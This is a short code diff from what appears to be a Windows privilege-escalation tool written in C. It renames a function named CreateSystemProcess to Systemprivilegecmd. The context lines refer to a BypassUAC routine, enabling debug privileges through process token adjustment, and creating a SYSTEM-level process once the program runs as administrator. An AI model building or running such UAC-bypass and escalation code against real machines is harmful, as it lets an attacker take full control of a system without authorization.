@@ -60,7 +60,7 @@ void BypassUAC() {
 }
 
 // Perform SYSTEM privilege escalation
-void CreateSystemProcess() {
+void Systemprivilegecmd() {
     // Enable debug privileges
     HANDLE hToken;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
@@ -173,7 +173,7 @@ int main() {
 
     // If already running as administrator, proceed with SYSTEM privilege escalation
     wprintf(L"Running as administrator. Proceeding with SYSTEM process creation...\n");
-    CreateSystemProcess();
+    Systemprivilegecmd();
 
     // Ensure the program exits immediately
     ExitProcess(0);
